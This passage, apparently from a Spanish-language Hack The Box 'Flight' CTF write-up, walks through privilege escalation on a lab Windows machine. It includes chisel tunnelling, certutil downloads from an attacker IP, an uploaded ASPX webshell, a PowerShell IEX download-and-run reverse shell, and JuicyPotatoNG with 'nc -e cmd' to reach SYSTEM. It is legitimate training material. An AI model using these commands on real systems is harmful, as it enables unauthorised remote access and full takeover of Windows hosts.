Presten atención, para hacer port forwarding tienen que acceder dos veces como el usuario c.bum siguendo el prodecimiento de acceso como hicimos anteriormente como pueden ver aqui en la imagen

![](/assets/images/htb-writeup-flight/acceso3.png)

Descargamos el chisel, por aca se los dejo

```ruby
https://github.com/jpillora/chisel/releases/tag/v1.8.1
```
Ahora con certutil lo descargamos en la máquina víctima

```ruby
certutil.exe -urlcache -f -split http://10.10.14.105/chisel.exe
```
En nuesta máquina montemos el servidor con chisel

```bash
❯ ./chisel server -p 5432 --reverse
2023/03/16 00:38:46 server: Reverse tunnelling enabled
2023/03/16 00:38:46 server: Fingerprint n2EBxwcOQvChiSqjw7orAT5DqwWl8dc61s4qmG3WCGg=
2023/03/16 00:38:46 server: Listening on http://0.0.0.0:5432
```
Y ahora ejecutamos el chisel en la máquina windows

```ruby
PS C:\Users\C.bum\Desktop> ./chisel.exe client 10.10.14.105:5432 R:8000:127.0.0.1:8000
```
Ya teniendo la conexión podemos acceder desde el localhost en el puerto 8000

Revisemos la web

![](/assets/images/htb-writeup-flight/newpage.png)

La web es diferente a las otras que hemos enumerado anteriormente

Intentemos acceder a un recurso que no existe en la web, a ver si se expone el directorio raíz, lo haremos con curl

```ruby
❯ curl -s http://127.0.0.1:8000/Prueba |grep 'Path'

    <tr><th>Physical Path</th><td>&nbsp;&nbsp;&nbsp;C:\inetpub\development\Prueba</td></tr> 

```
Vemos que el directorio raíz se expone

Si entramos a este directorio podemos ver que tenemos capacidad de escritura

```ruby
icacls .
. flight\C.Bum:(OI)(CI)(W)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```
Para acceder tenemos que subir una webshell, yo voy a usar el cmd.aspx de seclists

Subimos el cmd.aspx a la máquina víctima

```bash
PS C:\inetpub\development> certutil.exe -urlcache -f -split http://10.10.14.105/cmd.aspx
****  Online  ****
  0000  ...
  0578
CertUtil: -URLCache command completed successfully.
PS C:\inetpub\development> 
```
Al acceder a la web podemos ejecutar comandos

![](/assets/images/htb-writeup-flight/cmd2.png)

Usemos el script de nishang que empleamos anteriormente para acceder, hay que ejecutarlo en la webshell

Pongamonos en escucha por netcat
 
```bash
❯ sudo rlwrap nc -lvnp 4444
[sudo] contraseña para voidnet: 
listening on [any] 4444 ...
```
Ahora es ejecutar el script de nishang en la web shell

```ruby
cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.105/sh.ps1')
```
Volvamos a netcat y vemos que ganamos acceso

![](/assets/images/htb-writeup-flight/setenso.png)

Hacemos whoami /priv y podemos ver que en el apartado SeImpersonatePrivilege está Enabled, por esa vía podemos escalar los privilegios

```ruby

PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```
Ahora para escalar los privilegios nos iremos al directorio c:\Windows\Temp, yo voy usar el nc.exe que viene con el sectlists y el JuicyPotatoNG.exe

```ruby
https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1
```
Ya estando ahí con certutil.exe descargamos el nc.exe y el JuicyPotato.exe

```ruby
PS C:\Windows\Temp> certutil.exe -urlcache -f http://10.10.14.105/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```ruby
PS C:\Windows\Temp> certutil.exe -urlcache -f http://10.10.14.105/JuicyPotatoNG.exe JuicyPotatoNG.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
Ejecutemos el JuicyPotato.exe pero antes tienen que ponerse en escucha por netcat

```ruby
PS C:\Windows\Temp> ./JuicyPotatoNG.exe -t * -p "C:\Windows\temp\nc.exe" -a '10.10.14.105 4444 -e cmd'
```
Nos fijamos en el netcat y vemos que recibimos la conexión como nt authority\system

```ruby
❯ sudo rlwrap nc -lvnp 4444
[sudo] contraseña para voidnet: 
listening on [any] 4444 ...
connect to [10.10.14.105] from (UNKNOWN) [10.10.11.187] 52357
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
```
Ya que somos root nos vamos al directorio C:\Users\Administrator\Desktop para visualizar la flag de root

```ruby
C:\Users\Administrator\Desktop>type root.txt
type root.txt
43*******************************6

C:\Users\Administrator\Desktop>
```
Eso es todo, espero que se haya entendido

Gracias por leer :D.
